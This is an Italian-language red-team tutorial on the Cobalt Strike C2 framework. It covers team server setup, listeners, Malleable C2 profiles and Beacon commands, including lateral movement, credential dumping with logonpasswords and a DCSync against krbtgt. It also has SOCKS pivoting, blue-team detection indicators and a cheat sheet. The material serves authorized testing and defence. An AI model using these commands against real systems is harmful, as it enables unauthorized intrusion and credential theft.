---
title: 'Cobalt Strike: cos’è, come funziona Beacon e Malleable C2'
slug: cobaltstrike
description: 'Scopri come funziona Cobalt Strike nel Red Team: architettura Team Server, Beacon, listener, Malleable C2, post-exploitation e principali tecniche di detection.'
image: /cobalt-strike-horror-c2-beacon.webp
draft: true
date: 2026-08-23T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - Cobalt Strike
  - Beacon
  - Malleable C2
  - Team Server
  - Command and Control
featured: true
---

# Cobalt Strike: Guida Operativa al Framework C2 per Red Team

Cobalt Strike è uno dei framework C2 commerciali più utilizzati nel red teaming professionale: modella il comportamento di un attaccante avanzato — persistenza, movimento laterale, pivoting, comunicazioni mascherate da traffico legittimo — per testare quanto un'organizzazione riesca davvero a rilevare e rispondere a un'intrusione, non solo a bloccarne l'exploit iniziale.

**Prerequisiti:** licenza Cobalt Strike valida (è software commerciale, non open source), un ambiente di lab o un engagement autorizzato per iscritto, familiarità con [Active Directory](https://hackita.it/articoli/active-directory/) e post-exploitation Windows.

***

## Cos'è Cobalt Strike?

Cobalt Strike è un framework C2 commerciale, sviluppato da Fortra, pensato per adversary simulation e red team engagement. A differenza di un tool di exploitation puro come Metasploit, il suo focus è tutto sulla fase post-compromissione: mantenere l'accesso, muoversi lateralmente, e farlo in un modo che assomigli al comportamento di attaccanti reali, in modo da testare le difese dell'organizzazione — non solo se un exploit funziona, ma se un SOC lo nota.

**È importante essere chiari su un punto:** Cobalt Strike è software commerciale a licenza. Non è liberamente scaricabile né gratuito, e le copie "craccate" che circolano online sono esattamente lo strumento con cui gruppi ransomware e APT reali conducono intrusioni — usarle è sia illegale sia, di fatto, l'uso di malware. Questa guida presuppone una licenza legittima usata in un lab o in un engagement autorizzato per iscritto.

## Come Funziona: Architettura Team Server / Client / Beacon

```text
Team Server (Linux, sempre acceso)
      ↑↓
Client Cobalt Strike (uno o più operatori, GUI)
      ↑↓
Listener (HTTP/HTTPS/DNS/SMB/TCP)
      ↑↓
Beacon (payload sul target compromesso)
```

Il **Team Server** è il componente centrale: gira su Linux, gestisce i listener, riceve i check-in dei beacon e conserva sessione, log e dati collezionati. È anche il punto di collaborazione tra operatori: più persone si connettono allo stesso team server con il proprio client e condividono in tempo reale sessioni, log e risorse dell'engagement, invece di lavorare in modo isolato. Il **client** è l'interfaccia grafica con cui uno o più operatori si collegano al team server. Il **Beacon** è il payload che gira sull'host compromesso: non mantiene una connessione persistente come una shell reverse classica, ma fa "check-in" periodici (asincroni) verso il listener secondo un intervallo di sleep configurabile — comportamento che lo rende più difficile da individuare rispetto a una sessione interattiva costante.

***

## Setup: Team Server e Client

```bash
# Sul team server (Linux)
./teamserver <IP_esterno> <password> [/path/to/profilo.malleable]

# Dal client, connessione al team server
./cobaltstrike
# Host: IP del team server, Password: quella impostata all'avvio
```

Il profilo Malleable C2 (opzionale, ultimo argomento) va specificato all'avvio del team server — non si carica a runtime, e puoi caricarne uno solo per istanza. La sintassi esatta dei comandi di avvio può variare tra versioni (Cobalt Strike evolve regolarmente, la release corrente è la 4.13 al momento di questa guida) — verifica sempre la documentazione della versione installata.

Prima di usare un profilo Malleable durante un engagement, verificane sintassi e configurazione con lo strumento incluso `c2lint`:

```bash
./c2lint profilo.profile
```

***

## Listener: HTTP, HTTPS, DNS, SMB, TCP

Un listener definisce come i beacon comunicano con il team server. La scelta del tipo dipende dal contesto della rete target e dal profilo di detection che vuoi assumere.

| Tipo       | Quando usarlo                                                                                                          |
| ---------- | ---------------------------------------------------------------------------------------------------------------------- |
| HTTP/HTTPS | Il più comune in engagement reali — traffico web, si mimetizza con il resto del traffico aziendale                     |
| DNS        | Reti con egress molto ristretto dove solo il DNS esce liberamente                                                      |
| SMB        | Beacon peer-to-peer via named pipe, per la propagazione interna senza traffico C2 diretto verso l'esterno da ogni host |
| TCP        | Comunicazione diretta punto-punto, tipicamente tra beacon già collegati                                                |

```text
Cobalt Strike → Listeners → Add/Edit
```

**Nota sul certificato TLS:** il certificato e gli altri indicatori predefiniti possono essere riconoscibili dai sistemi di detection se lasciati invariati. In un engagement realistico la configurazione viene normalmente adattata allo scenario di test — tipicamente un certificato valido (es. Let's Encrypt) su un'infrastruttura di redirector dedicata, non l'endpoint del team server esposto direttamente.

***

## Malleable C2: Personalizzare le Comunicazioni del Beacon

Un profilo Malleable C2 è un piccolo linguaggio specifico che ridefinisce come il beacon trasforma e nasconde i propri dati dentro il traffico HTTP/HTTPS — user-agent, URI, header, formato del body — così da somigliare a traffico legittimo (o a quello di un malware noto, per scopi di emulazione di una minaccia specifica) invece che al pattern di default, riconoscibile.

```text
# Estratto concettuale di un profilo Malleable
http-get {
    set uri "/api/v1/status";
    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    }
    server {
        header "Content-Type" "application/json";
    }
}
```

I profili pubblici (repository come `Cobalt-Strike/Malleable-C2-Profiles` su GitHub) sono un ottimo punto di partenza per capire la sintassi, ma un profilo copiato senza modifiche è riconoscibile quanto quello di default — il valore sta nel personalizzarlo per l'engagement specifico.

***

## Comandi Beacon Fondamentali

Dal client, il payload si genera da `Attacks → Packages` (o dal menu Payloads), scegliendo formato (eseguibile, DLL, PowerShell, shellcode raw) e listener di riferimento. Una volta eseguito sul target, il beacon compare come sessione attiva nel client.

Comandi base sulla sessione beacon:

```text
beacon> sleep 60 20        # check-in ogni 60s, jitter 20%
beacon> shell whoami        # esegue un comando via cmd.exe
beacon> run ipconfig /all   # esegue senza spawnare cmd, output diretto
beacon> execute-assembly /path/tool.exe   # esegue un assembly .NET in-memory
beacon> upload file.exe C:\Windows\Temp\file.exe
beacon> download C:\Users\vittima\Desktop\report.docx
beacon> portscan 10.10.10.0/24 445 arp
```

`sleep` e il jitter associato sono la prima leva OPSEC: un valore basso migliora la reattività dell'operatore ma aumenta il volume di comunicazioni osservabili, un valore alto con jitter randomizzato riduce il traffico ed è più stealth ma rallenta l'operatività. Beacon può anche girare in modalità quasi interattiva con `sleep 0`, utile in fase di test ma molto più rumoroso.

***

## Movimento Laterale via Beacon

```text
beacon> jump psexec64 TARGET LISTENER      # servizio remoto, crea artefatti su disco
beacon> jump winrm64 TARGET LISTENER       # via WinRM, se disponibile
beacon> remote-exec wmi TARGET comando     # esecuzione via WMI

beacon> logonpasswords                  # dump credenziali via Mimikatz integrato
beacon> dcsync CORP.local CORP\krbtgt   # DCSync su un account specifico
```

`dcsync` in Beacon replica la stessa tecnica descritta nella guida a [DCSync](https://hackita.it/articoli/dcsync/), integrata direttamente nella sessione invece di richiedere un tool esterno separato.

Il Golden Ticket in Cobalt Strike **non** si genera con un comando digitato in console: si usa dal menu grafico `[beacon] → Access → Golden Ticket`, fornendo utente, dominio, SID e hash krbtgt — Cobalt Strike richiama Mimikatz internamente e inietta il ticket nella sessione.

`TARGET` è l'host di destinazione, `LISTENER` è il nome del listener che il nuovo beacon userà per collegarsi indietro — non il nome del protocollo. È un errore comune confondere i due parametri quando si copia un esempio senza guardare la sintassi con attenzione.

Questi comandi ricalcano quello che fanno manualmente tool come [Impacket](https://hackita.it/articoli/impacket/) (`psexec.py`, `wmiexec.py`) — la differenza è che qui restano nella stessa sessione e nello stesso set di log del team server, comodo per il reporting a fine engagement. Per il dump di credenziali via Mimikatz integrato, vale la stessa logica della guida dedicata a [Mimikatz](https://hackita.it/articoli/mimikatz/): un conto è l'autenticazione, un altro i privilegi effettivi ottenuti.

### Beacon Peer-to-Peer (SMB e TCP)

Su reti dove non vuoi che ogni host compromesso apra una connessione C2 diretta verso l'esterno, incatena i beacon tra loro:

```text
beacon> link TARGET pipename    # collega un beacon SMB tramite named pipe
beacon> connect IP PORT         # collega un beacon TCP
```

Solo il beacon "parent" della catena parla davvero con il team server — gli altri comunicano attraverso di lui via SMB/TCP interno invece di instaurare ciascuno una connessione diretta con l'infrastruttura C2, riducendo drasticamente il traffico C2 osservabile dal perimetro.

***

## Cobalt Strike SOCKS Proxy e Pivoting

```text
beacon> socks 1080
```

Apre un proxy SOCKS sul team server che instrada il traffico attraverso il beacon compromesso, verso la rete interna che il beacon stesso può raggiungere — utile per puntare tool esterni (Nmap, un browser, un client RDP) contro segmenti di rete altrimenti irraggiungibili. Concettualmente è lo stesso principio di [Chisel](https://hackita.it/articoli/chisel/), integrato nativamente nel framework.

```text
beacon> ssh 10.10.17.12:22 username password
```

Cobalt Strike può anche aprire una connessione SSH direttamente dal beacon, utile quando il target ha accesso a un host Linux/dispositivo raggiungibile solo da quella posizione di rete.

***

## Aggressor Script e BOF: Estendere il Framework

Cobalt Strike è scriptabile via **Aggressor Script**, un linguaggio derivato da Sleep che permette di automatizzare workflow, aggiungere comandi custom alla console beacon e integrare tool di terze parti direttamente nel client. I **Beacon Object File (BOF)** sono piccoli programmi in C compilati che girano direttamente nel processo del beacon, senza spawnare un nuovo processo — un'alternativa più leggera e più difficile da rilevare rispetto a `execute-assembly` per operazioni mirate (enumerazione, piccole azioni di sistema).

Non è necessario scrivere BOF o Aggressor Script da zero per usare Cobalt Strike in modo efficace — sono strumenti di estensione per chi vuole personalizzare oltre le funzionalità core del prodotto. L'ecosistema di estensione continua a crescere nelle release più recenti con ulteriori meccanismi di esecuzione e packaging oltre ai BOF classici — verifica sempre le note di rilascio della versione che usi.

***

## Cobalt Strike vs Metasploit

Sono strumenti complementari più che diretti concorrenti — la differenza sta nel focus principale:

|                        | Cobalt Strike              | Metasploit                                       |
| ---------------------- | -------------------------- | ------------------------------------------------ |
| Focus                  | Adversary simulation / C2  | Exploitation                                     |
| Post-exploitation      | Punto di forza centrale    | Presente, meno centrale                          |
| C2                     | Funzionalità core (Beacon) | Disponibile via moduli/payload, meno strutturato |
| Collaborazione team    | Nativa (Team Server)       | Meno centrale nel design                         |
| Malleable C2           | Sì                         | Non ha un equivalente diretto                    |
| BOF / Aggressor Script | Sì                         | Nessun equivalente diretto                       |
| Licenza                | Commerciale                | Open source (core framework)                     |

## Cobalt Strike vs Alternative Open Source

| Framework         | Licenza            | C2                              | Estensioni            | Punto di forza                                                             |
| ----------------- | ------------------ | ------------------------------- | --------------------- | -------------------------------------------------------------------------- |
| **Cobalt Strike** | Commerciale        | Beacon (HTTP/HTTPS/DNS/SMB/TCP) | Aggressor Script, BOF | Maturità, Malleable C2, standard de facto nel settore                      |
| **Sliver**        | Open source        | Multi-protocollo                | Estensioni Go/Armory  | Multi-piattaforma nativo (Windows/Linux/macOS), nessun costo di licenza    |
| **Mythic**        | Open source        | Multi-agent                     | Agent intercambiabili | Architettura modulare, forte estensibilità                                 |
| **Havoc**         | Open source        | HTTP/HTTPS/SMB                  | Moduli custom         | Framework C2 moderno con forte focus su personalizzazione ed estensibilità |
| **Metasploit**    | Open source (core) | Limitato/tramite moduli         | Moduli Ruby           | Più adatto a exploitation puntuale che a C2 persistente                    |

Cobalt Strike resta lo strumento con cui la maggior parte dei blue team confronta le proprie detection, proprio perché è tra i più diffusi — un vantaggio per chi deve validare le difese contro la minaccia più comune, uno svantaggio se l'obiettivo è restare sotto il radar di un blue team che lo conosce bene.

***

## Detection Lato Blue Team

Sapere come viene rilevato Cobalt Strike è importante tanto quanto saperlo usare — sia per chi difende, sia per un red teamer che vuole capire cosa aspettarsi durante l'engagement. Nessun singolo indicatore basta da solo: la detection efficace nasce quasi sempre dalla combinazione di più segnali.

**Indicatori di rete:**

* JA3/JA3S fingerprinting del client TLS, se la libreria TLS non è personalizzata
* Il certificato TLS di default, se il team server non ne usa uno valido
* Metadata HTTP (URI, header, formato del body) non personalizzati nel profilo Malleable
* Named pipe con pattern noti (`\\.\pipe\msagent_*`, `\\.\pipe\status_*` e simili, se non rinominate in un profilo custom)
* Pattern di check-in regolari anche con jitter, se osservati su una finestra temporale abbastanza lunga

**Indicatori host:**

* Artefatti di process injection tipici (allocazioni di memoria RWX, thread iniettati in processi legittimi)
* Log di creazione servizi/task per `psexec`/`jump`, simili a quelli di [Impacket](https://hackita.it/articoli/impacket/) e altri tool di lateral movement
* Attività WMI anomala, se usata per l'esecuzione remota
* Regole YARA pubbliche che identificano pattern nel beacon (specialmente su versioni craccate/leaked, spesso non aggiornate e con firme note)
* Attività di [Mimikatz](https://hackita.it/articoli/mimikatz/) integrato, con gli stessi indicatori EDR del tool standalone

**Contromisura pratica per i difensori:** un profilo Malleable C2 di default, un certificato TLS non valido/auto-firmato e check-in a intervalli fissi restano tra i segnali più facili da intercettare — molte detection efficaci partono proprio da questi elementi prima ancora di arrivare all'analisi approfondita degli host.

## OPSEC durante un Red Team Engagement

Senza entrare in procedure di evasione avanzata (fuori scopo per questa guida), gli elementi che un operatore tiene sotto controllo durante un engagement sono essenzialmente gli stessi visti nella sezione detection, letti dal lato opposto:

* valori di sleep/jitter coerenti con il profilo di minaccia che si sta emulando
* profilo Malleable personalizzato, non quello di default
* infrastruttura C2 con certificato valido e redirector, non il team server esposto direttamente
* uso di beacon P2P per ridurre il traffico C2 diretto da ogni host
* logging accurato lato team server, utile sia per l'operatore sia per il report finale
* consapevolezza degli artefatti host che le proprie azioni lasciano (servizi creati, processi iniettati, chiamate WMI)

L'obiettivo di un buon OPSEC in un engagement autorizzato non è "non farsi mai scoprire" a ogni costo, ma generare un comportamento realistico che permetta di misurare onestamente le capacità di detection dell'organizzazione testata.

***

## MITRE ATT\&CK

| Tattica              | Tecnica                                    | Dove nell'articolo                      |
| -------------------- | ------------------------------------------ | --------------------------------------- |
| Command and Control  | T1071.001 — Web Protocols                  | Listener HTTP/HTTPS                     |
| Command and Control  | T1071.004 — DNS                            | Listener DNS                            |
| Command and Control  | T1095 — Non-Application Layer Protocol     | Listener TCP                            |
| Command and Control  | T1090 — Proxy                              | `socks`, pivoting verso la rete interna |
| Lateral Movement     | T1021.002 — SMB/Windows Admin Shares       | `jump psexec64`                         |
| Lateral Movement     | T1021.006 — Windows Remote Management      | `jump winrm64`                          |
| Execution            | T1047 — Windows Management Instrumentation | `remote-exec wmi`                       |
| Credential Access    | T1003 — OS Credential Dumping              | `logonpasswords`                        |
| Privilege Escalation | T1055 — Process Injection                  | Esecuzione in-memory del beacon         |
| Discovery            | T1046 — Network Service Discovery          | `portscan`                              |

Matrice completa: [MITRE ATT\&CK Enterprise](https://attack.mitre.org/matrices/enterprise/) · Scheda dedicata: [MITRE ATT\&CK — Cobalt Strike (S0154)](https://attack.mitre.org/software/S0154/)

***

## Workflow Operativo

```
Team Server attivo (Linux)
      ↓
Listener configurato (HTTP/HTTPS/DNS/SMB/TCP) con profilo Malleable dedicato
      ↓
Generazione beacon (eseguibile/DLL/PowerShell/shellcode)
      ↓
Delivery iniziale (phishing, exploit, accesso fisico — fuori scope di questo articolo)
      ↓
Check-in beacon sul team server
      ↓
Enumerazione + escalation privilegi
      ↓
Movimento laterale (jump, remote-exec, link/connect per P2P)
      ↓
Pivoting (socks, ssh) verso segmenti di rete interni
      ↓
Obiettivo dell'engagement raggiunto
      ↓
Detection Validation — quanto del percorso ha rilevato il blue team?
      ↓
Report
```

***

## Troubleshooting

| Problema                                | Causa probabile                                                                        |
| --------------------------------------- | -------------------------------------------------------------------------------------- |
| Beacon non fa mai check-in              | Listener/porta non raggiungibile, o firewall che blocca il traffico in uscita          |
| Team server non si avvia                | Password/argomenti mancanti, o porta già in uso                                        |
| Beacon rilevato immediatamente dall'EDR | Profilo Malleable di default, nessuna personalizzazione del payload                    |
| `jump psexec` fallisce                  | Credenziali senza privilegi admin locali sul target, o SMB signing/firewall che blocca |
| Sessione persa dopo poco                | Sleep troppo lungo interpretato come inattività, o il processo host è stato terminato  |

***

## FAQ

**Cos'è Cobalt Strike Beacon?**
Il payload di Cobalt Strike che gira sull'host compromesso e comunica con il team server tramite check-in periodici asincroni (o quasi interattivi con `sleep 0`), invece di una connessione costante.

**Cos'è un Malleable C2 Profile?**
Un file di configurazione che ridefinisce come il beacon trasforma e nasconde i propri dati nel traffico HTTP/HTTPS — user-agent, URI, header, formato del body — per somigliare a traffico legittimo o a una minaccia specifica, invece del pattern di default riconoscibile.

**Cobalt Strike è un malware?**
Il software originale è uno strumento commerciale legittimo per red teaming e adversary simulation, con licenza a pagamento. Copie piratate o craccate, però, sono la stessa base di codice usata da threat actor reali in attacchi ransomware e vengono classificate dai sistemi di sicurezza come tooling malevolo — usarle è illegale a prescindere dall'intento.

**Cobalt Strike è gratuito?**
No, è software commerciale con licenza a pagamento distribuito da Fortra. Le copie craccate che circolano online sono spesso lo stesso strumento usato in attacchi reali — usarle è illegale.

**Cobalt Strike può sostituire Metasploit?**
Non del tutto: Metasploit resta più forte per l'exploitation puntuale di vulnerabilità note, Cobalt Strike è pensato specificamente per la fase post-compromissione e l'adversary simulation.

**Cos'è un Beacon?**
Il payload di Cobalt Strike che gira sull'host compromesso e comunica con il team server tramite check-in periodici asincroni, invece di una connessione interattiva costante.

**A cosa serve un profilo Malleable C2?**
A personalizzare come il beacon si presenta nel traffico di rete — user-agent, URI, formato dei dati — per mimetizzarsi meglio o emulare una minaccia specifica durante un test.

**Quali sono le alternative open source a Cobalt Strike?**
Sliver, Mythic e Havoc sono i framework C2 open source più usati oggi nel red teaming, senza costo di licenza.

**Come fa un blue team a rilevare Cobalt Strike?**
Principalmente da certificato TLS di default, fingerprint JA3/JA3S del client, pattern di check-in regolari e named pipe con nomi noti — tutti elementi che un profilo Malleable ben configurato riduce mitiga, ma non elimina del tutto.

**Cobalt Strike è legale da usare?**
Sì, con una licenza valida e in un engagement autorizzato per iscritto o in un lab personale. Il possesso o l'uso di copie craccate, o l'uso contro sistemi senza autorizzazione, sono reati.

***

## Cheat Sheet Finale

```text
=== SETUP ===
Team server:  ./teamserver <IP> <password> [/path/profilo.malleable]
Client:       ./cobaltstrike
Lint profilo: ./c2lint profilo.profile

=== LISTENER ===
GUI:          Cobalt Strike → Listeners → Add/Edit
Tipi:         HTTP, HTTPS, DNS, SMB, TCP

=== BEACON BASE ===
sleep:        beacon> sleep 60 20
shell:        beacon> shell whoami
run:          beacon> run ipconfig /all
assembly:     beacon> execute-assembly /path/tool.exe
upload:       beacon> upload file.exe C:\Windows\Temp\file.exe
download:     beacon> download C:\path\file.docx
portscan:     beacon> portscan 10.10.10.0/24 445 arp

=== LATERAL MOVEMENT ===
psexec:       beacon> jump psexec64 TARGET smb
winrm:        beacon> jump winrm64 TARGET
wmi:          beacon> remote-exec wmi TARGET comando
credenziali:  beacon> logonpasswords

=== P2P BEACON ===
SMB:          beacon> link TARGET pipename
TCP:          beacon> connect IP PORT

=== PIVOTING ===
SOCKS:        beacon> socks 1080
SSH:          beacon> ssh IP:22 user password
```

***

**Guide correlate su hackita.it:**

* [Active Directory: Attack Paths Completi](https://hackita.it/articoli/active-directory/)
* [Impacket: Tool Suite per AD](https://hackita.it/articoli/impacket/)
* [Mimikatz su HackIta](https://hackita.it/articoli/mimikatz/)
* [Chisel: TCP Tunneling per Pivoting](https://hackita.it/articoli/chisel/)
* [Kerberos](https://hackita.it/articoli/kerberos/)
* [Credential Dumping: Come Estrarre Hash](https://hackita.it/articoli/credential-dumping/)

## Riferimenti

* [Cobalt Strike — documentazione ufficiale](https://www.cobaltstrike.com/product/features)
* [HackTricks — Cobalt Strike](https://hacktricks.wiki/en/windows-hardening/cobalt-strike.html)
* [MITRE ATT\&CK — Software: Cobalt Strike](https://attack.mitre.org/software/S0154/)
